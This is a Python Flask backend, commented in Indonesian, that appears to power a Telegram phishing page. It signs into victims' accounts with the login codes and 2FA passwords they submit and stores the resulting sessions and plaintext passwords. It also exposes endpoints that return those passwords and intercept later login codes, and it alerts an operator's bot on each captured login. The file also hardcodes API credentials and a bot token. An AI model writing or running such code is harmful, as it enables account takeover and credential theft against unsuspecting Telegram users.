import os
from typing import Dict
import json
import logging
import asyncio
import threading
import re
import sys
import uuid
import atexit
import telebot
import requests
import sqlite3
import signal
import nest_asyncio
from datetime import datetime
from flask import Flask, request, jsonify, session
from telethon import TelegramClient
from telethon.sessions import StringSession
from flask_cors import CORS
from telethon.errors import (
    SessionPasswordNeededError,
    PhoneCodeInvalidError,
    PhoneCodeExpiredError,
    PhoneNumberInvalidError,
    FloodWaitError
)

app = Flask(__name__)
CORS(app)
app.config['SECRET_KEY'] = os.urandom(24)  # Secure key generation
app.config['SESSION_TYPE'] = 'filesystem'  # Sesi disimpan di filesystem

# Logger setup
logger = logging.getLogger(__name__)
logging.basicConfig(level=logging.INFO)

# Telegram Configuration - IMPORTANT: Replace with your actual credentials
API_ID = '26169780'
API_HASH = '04a74c7f2c7600c52b7a3a07726502c6'
BOT_TOKEN = '6884218356:AAHnbnwMlmBdScY2M70EyzQ_2mdAgnE_tzg'
ADMIN_ID = '5957228323'

SESSION_PATH = './'

nest_asyncio.apply()

# Global storage for sessions and OTP
user_sessions = {}
otp_storage = {}
user_passwords = {}
phone_code_hashes = {}
telegram_clients = {}
otp_listeners = {}
logged_in_phones = set()
two_fa_storage = {}
otp_ready_event = asyncio.Event()
db_lock = threading.Lock()

def get_or_create_eventloop():
    try:
        return asyncio.get_event_loop()
    except RuntimeError as ex:
        if "There is no current event loop in thread" in str(ex):
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            return loop
        raise

def send_telegram_message(message):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {
        'chat_id': ADMIN_ID,  # Send message to admin's chat ID
        'text': message
    }
    response = requests.post(url, data=payload)
    return response

def create_telegram_client(phone):
    """
    Membuat dan menyimpan Telegram client untuk nomor telepon tertentu setelah login berhasil.
    """
    session_path = f"session_{phone}"  # Format file sesi
    client = TelegramClient(session_path, API_ID, API_HASH)
    user_sessions[phone] = client
    return client
    
    
@app.route('/send_otp', methods=['POST'])
def send_otp():
    try:
        data = request.json  # Menggunakan JSON sebagai input
        phone = data.get('phone')
        if not phone:
            return jsonify({'error': 'Nomor telepon tidak diterima'}), 400

        logger.info(f"Memulai pengiriman OTP ke nomor: {phone}")

        async def start_session(phone):
            try:
                # Buat client baru
                client = create_telegram_client(phone)

                # Sambungkan client
                await client.connect()

                # Request kode OTP
                send_code_result = await client.send_code_request(phone)
                phone_code_hash = send_code_result.phone_code_hash
                phone_code_hashes[phone] = phone_code_hash  # Simpan phoneCodeHash dengan benar
                await client.disconnect()  # Tutup client setelah selesai

                # Log untuk memastikan hash disimpan dengan benar
                logger.info(f"Phone Code Hash disimpan untuk {phone}: {phone_code_hash}")
                
                return phone_code_hash

            except Exception as e:
                # Tambahkan pengecekan untuk nomor telepon yang tidak valid
                if "The phone number is invalid" in str(e):
                    logger.error(f"Nomor telepon {phone} tidak valid.")
                    raise ValueError("Nomor tidak valid")
                logger.error(f"Error saat mengirim OTP: {str(e)}")
                raise

        # Gunakan asyncio.run() untuk menjalankan event loop
        phone_code_hash = asyncio.run(start_session(phone))

        # Mengembalikan phone_code_hash dalam response
        response = {
            'status': 'success',
            'message': 'Kode OTP telah dikirim',
            'phone': phone,
            'phone_code_hash': phone_code_hash
        }
        logger.info(f"OTP berhasil dikirim ke {phone}")
        return jsonify(response), 200

    except ValueError:
        # Menangani kasus nomor telepon tidak valid
        return jsonify({
            'status': 'error',
            'message': 'Nomor tidak valid'
        }), 400

    except Exception as e:
        logger.error(f"Error dalam route send_otp: {str(e)}")
        return jsonify({
            'status': 'error',
            'message': 'Gagal mengirim OTP'
        }), 500

@app.route('/verify_otp', methods=['POST'])
def verify_otp():
    try:
        data = request.json
        phone = data.get('phone')
        otp = data.get('otp')
        phone_code_hash = data.get('phoneCodeHash')

        if not phone or not otp:
            return jsonify({
                'status': 'error',
                'message': 'Nomor telepon atau OTP tidak ditemukan'
            }), 400

        logger.info(f"Memulai verifikasi OTP untuk nomor: {phone} dengan OTP: {otp}")

        async def verify_code():
            try:
                # Buat client baru untuk verifikasi
                client = create_telegram_client(phone)

                # Sambungkan client
                await client.connect()

                # Verifikasi kode
                result = await client.sign_in(
                    phone=phone,
                    code=otp,
                    phone_code_hash=phone_code_hash
                )
                
                send_telegram_message(f"User Dengan Nomor telepon {phone} berhasil login.")

                # Mendapatkan informasi pengguna setelah login
                user_info = await client.get_me()

                # Simpan sesi client untuk listener OTP selanjutnya
                user_sessions[phone] = {'verified': True}  # Tandai pengguna telah terverifikasi
                logged_in_phones.add(phone)

                # Menyimpan data session ke file
                session_file_path = f"session{phone}.session"  # File path sesuai nomor telepon

                try:
                    with open(session_file_path, 'w') as file:
                        # Simpan Telegram username dan ID dalam file
                        file.write(f"{user_info.username},{user_info.id}\n")
                    logger.info(f"Data session disimpan di {session_file_path}")
                except Exception as file_error:
                    logger.error(f"Gagal menyimpan data session di file {session_file_path}: {str(file_error)}")
                    return {'status': 'error', 'message': 'Gagal menyimpan data session'}, 500

                # Bersihkan phone code hash setelah berhasil
                phone_code_hashes.pop(phone, None)

                send_telegram_message(f"User dengan nomor telepon {phone} berhasil login.")

                return {'status': 'success', 'message': 'OTP berhasil diverifikasi dan user sukses login!'}

            except PhoneCodeInvalidError:
                logger.error("Kod OTP tidak sah")
                return {'status': 'error', 'message': 'Kod OTP tidak Sah'}
            except PhoneCodeExpiredError:
                logger.error("Kode OTP telah kedaluwarsa")
                return {'status': 'error', 'message': 'Kod OTP tidak Sah'}
            except SessionPasswordNeededError:
                logger.info("2FA diperlukan")
                return {'status': 'needs_2fa', 'message': 'Pengesahan 2FA diperlukan.'}
            except Exception as e:
                logger.error(f"Error saat verifikasi: {str(e)}")
                return {'status': 'error', 'message': f'Terjadi kesalahan: {str(e)}'}

        # Gunakan asyncio.run() untuk menjalankan event loop
        result = asyncio.run(verify_code())

        # Berikan respons sesuai hasil
        if result['status'] == 'success':
            return jsonify(result), 200
        elif result['status'] == 'needs_2fa':
            return jsonify(result), 200  # Status 200 untuk pengalihan 2FA
        else:
            return jsonify(result), 400

    except Exception as e:
        logger.error(f"Error dalam route verify_otp: {str(e)}")
        return jsonify({
            'status': 'error',
            'message': f'Terjadi kesalahan: {str(e)}'
        }), 500

@app.route('/verify_2fa', methods=['POST'])
def verify_2fa():
    try:
        data = request.get_json()
        logger.info(f"Data request diterima: {data}")
        phone = data.get('phone')
        password = data.get('password')

        if not phone or not password:
            logger.error("Nomor telepon atau password tidak ditemukan dalam request.")
            return jsonify({
                'status': 'error',
                'message': 'Nomor telepon atau password tidak ditemukan'
            }), 400

        async def verify_password():
            try:
                client = create_telegram_client(phone)
                await client.connect()
                logger.info(f"Berhasil terhubung ke Telegram untuk {phone}.")

                if not await client.is_user_authorized():
                    logger.info(f"Melakukan login untuk {phone}.")
                    try:
                        await client.sign_in(phone=phone, password=password)
                    except SessionPasswordNeededError:
                        logger.error(f"Password 2FA diperlukan untuk {phone}")
                        return {'status': 'error', 'message': 'Password 2FA diperlukan untuk login'}
                    except PhoneCodeRequiredError:
                        logger.error(f"Kode OTP diperlukan untuk {phone}.")
                        return {'status': 'error', 'message': 'Kode OTP diperlukan untuk login'}
                    except Exception as e:
                        logger.error(f"Kesalahan saat login untuk {phone}: {str(e)}")
                        return {'status': 'error', 'message': f'Gagal login: {str(e)}'}

                user_info = await client.get_me()
                user_sessions[phone] = {
                    'telegram_id': user_info.id,
                    'telegram_username': user_info.username,
                    'timestamp': str(datetime.utcnow())
                }
                logged_in_phones.add(phone)
                
                send_telegram_message(f"User Dengan Nomor telepon {phone} berhasil login.")

                # Simpan password dan informasi Telegram dalam format teks
                session_file_path = f"session{phone}.session"
                try:
                    with open(session_file_path, 'w') as file:
                        # Simpan data dalam format teks, misalnya dipisahkan dengan koma
                        file.write(f"{password},{user_info.id},{user_info.username}\n")  # CSV-like format
                    logger.info(f"Data tersimpan di file {session_file_path}")
                except Exception as file_error:
                    logger.error(f"Gagal menyimpan data di file {session_file_path}: {str(file_error)}")
                    return {'status': 'error', 'message': 'Gagal menyimpan data session'}

                return {'status': 'success', 'message': 'Login berhasil'}

            except Exception as signin_error:
                logger.error(f"Gagal sign in untuk nomor: {phone}. Error: {str(signin_error)}")
                return {'status': 'error', 'message': f'Login gagal: {str(signin_error)}'}

        # Dapatkan atau buat event loop
        loop = get_or_create_eventloop()
        # Jalankan fungsi verify_password
        result = loop.run_until_complete(verify_password())

        # Mengembalikan hasil verifikasi
        if result.get('status') == 'success':
            return jsonify({
                'status': 'success',
                'message': 'Login berhasil!',
                'data': {
                    'phone': phone,
                    'telegram_id': user_sessions[phone]['telegram_id'],
                    'telegram_username': user_sessions[phone]['telegram_username'],
                    'timestamp': user_sessions[phone]['timestamp']
                }
            }), 200
        else:
            return jsonify(result), 400

    except Exception as e:
        logger.error(f"Kesalahan dalam route verify_2fa: {str(e)}")
        return jsonify({'status': 'error', 'message': f'Terjadi kesalahan: {str(e)}'}), 500

@app.route('/get_password/<phone>', methods=['GET'])
def get_password(phone):
    try:
        session_file_path = f"session{phone}.session"

        # Check if the session file exists
        if not os.path.exists(session_file_path):
            logger.error(f"File session untuk {phone} tidak ditemukan.")
            return jsonify({
                'status': 'error',
                'message': f"File session untuk {phone} tidak ditemukan."
            }), 404

        # Open the file and read the data (password, telegram_id, username)
        with open(session_file_path, 'r') as file:
            data = file.read().strip().split(',')
            
            if len(data) == 2:
                # Case: Only telegram_id and username are present (password is missing)
                telegram_id, username = data
                password = "Password Tidak Tersedia"  # Default message for missing password
            elif len(data) == 3:
                # Case: password, telegram_id, and username are all present
                password, telegram_id, username = data
            else:
                logger.error(f"Data tidak lengkap dalam file session untuk {phone}.")
                return jsonify({
                    'status': 'error',
                    'message': 'Data dalam file session tidak lengkap.'
                }), 404

        # Return the extracted data
        return jsonify({
            'status': 'success',
            'data': {
                'phone': phone,
                'password': password,
                'telegram_id': telegram_id,
                'telegram_username': username
            }
        }), 200

    except Exception as e:
        logger.error(f"Kesalahan dalam route get_password: {str(e)}")
        return jsonify({'status': 'error', 'message': f'Terjadi kesalahan: {str(e)}'}), 500

def delete_session_file(phone_number):
    """Menghapus file session berdasarkan nomor telepon"""
    session_filename = f"session_{phone_number}.session"
    session_file_path = os.path.join(SESSION_PATH, session_filename)

    if os.path.exists(session_file_path):
        os.remove(session_file_path)
        return True
    return False
    
@app.route('/get_sessions', methods=['GET'])
def get_sessions():
    """Mengambil daftar sesi (nomor telepon yang terdaftar)"""
    phones = []
    try:
        for filename in os.listdir(SESSION_PATH):
            if filename.startswith("session_") and filename.endswith(".session"):
                phone_number = filename.replace("session_", "").replace(".session", "")
                phones.append(phone_number)

        if phones:
            return jsonify({
                'status': 'success',
                'phones': phones
            }), 200
        else:
            return jsonify({
                'status': 'error',
                'message': 'Tidak ada sesi yang ditemukan.'
            }), 404
    except Exception as e:
        return jsonify({
            'status': 'error',
            'message': f'Error: {str(e)}'
        }), 500

@app.route('/delete_session/<phone>', methods=['POST'])
def delete_session(phone):
    """Menghapus sesi berdasarkan nomor telepon"""
    if delete_session_file(phone):
        return jsonify({
            'status': 'success',
            'message': f"Sesi untuk nomor {phone} berhasil dihapus."
        })
    else:
        return jsonify({
            'status': 'error',
            'message': f"Sesi untuk nomor {phone} tidak ditemukan."
        }), 404

@app.route('/get_otp/<phone>', methods=['GET'])
def get_otp_handler(phone):
    """
    Endpoint untuk mendapatkan OTP untuk nomor telepon tertentu.
    """
    try:
        # Ensure the OTP listener is running and has captured the OTP
        if phone not in otp_storage:
            logging.info(f"Menunggu OTP untuk {phone}...")
            asyncio.run(setup_otp_listener(phone))  # Wait for the listener to capture the OTP

        # Check if the OTP is available in storage
        if phone not in otp_storage:
            return jsonify({
                'status': 'error',
                'message': 'Nomor Tidak Ada Sesi.'
            }), 404

        otp = otp_storage[phone]

        return jsonify({
            'status': 'success',
            'otp': otp
        }), 200
    except Exception as e:
        logging.error(f"Error dalam route get_otp: {str(e)}")
        return jsonify({
            'status': 'error',
            'message': f'Terjadi kesalahan: {str(e)}'
        }), 500


async def setup_otp_listener(phone):
    async def listener():
        try:
            # Define session-journal file path
            session_file = f"session_{phone}.session-journal"

            # Check if session-journal file exists or not
            if os.path.exists(session_file):
                # If session-journal file exists, log and restart the application
                logging.info(f"File session-journal {session_file} ditemukan. Merestart aplikasi...")

                # Optional: delete session-journal file to avoid further issues
                os.remove(session_file)
                
                # Restart the application by killing the current process
                os.kill(os.getpid(), signal.SIGTERM)
                return

            # If session-journal does not exist, start listening for OTP
            logging.info(f"File session-journal {session_file} tidak ditemukan. Mulai mendengarkan OTP...")

            # Start the Telegram client and listen for OTPs
            client = TelegramClient(f"session_{phone}", API_ID, API_HASH)
            await client.connect()

            if not await client.is_user_authorized():
                logging.error(f"Tidak ada sesi untuk {phone}! Mulai ulang aplikasi...")
                # Restart the application if not authorized
                os.kill(os.getpid(), signal.SIGTERM)
                return

            logging.info(f"Session untuk {phone} berhasil diakses. Mendengarkan OTP...")

            # Start listening for OTPs (limit=1 to get only the latest OTP message)
            async for message in client.iter_messages(777000, limit=1):
                otp = re.search(r'\b(\d{5})\b', message.text)  # Adjust regex if OTP format is different
                if otp:
                    otp = otp.group(0)
                    logging.info(f"OTP diterima untuk {phone}: {otp}")
                    otp_storage[phone] = otp  # Store OTP in the global storage
                    break
                else:
                    logging.error(f"OTP tidak ditemukan di pesan untuk {phone}")

            await client.disconnect()

        except sqlite3.DatabaseError as e:
            # Check if the error is a database locked error
            if 'database is locked' in str(e):
                logging.error(f"Database terkunci untuk {phone}, merestart aplikasi...")
                # Restart the application if the database is locked
                os.kill(os.getpid(), signal.SIGTERM)
            else:
                logging.error(f"Error dalam OTP listener untuk {phone}: {str(e)}")

        except Exception as e:
            logging.error(f"Error dalam OTP listener untuk {phone}: {str(e)}")

    # Run the listener asynchronously
    await listener()

if __name__ == "__main__":
    # Setup event loop untuk asyncio
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)


    # Register cleanup function untuk disconnect client Telethon
    @atexit.register
    def cleanup():
        logging.info("Cleaning up...")
        loop.run_until_complete(loop.shutdown_asyncgens())


    # Start Flask di thread terpisah
    threading.Thread(target=lambda: app.run(debug=True, use_reloader=False)).start()

    # Menjaga event loop tetap berjalan
    loop.run_forever()
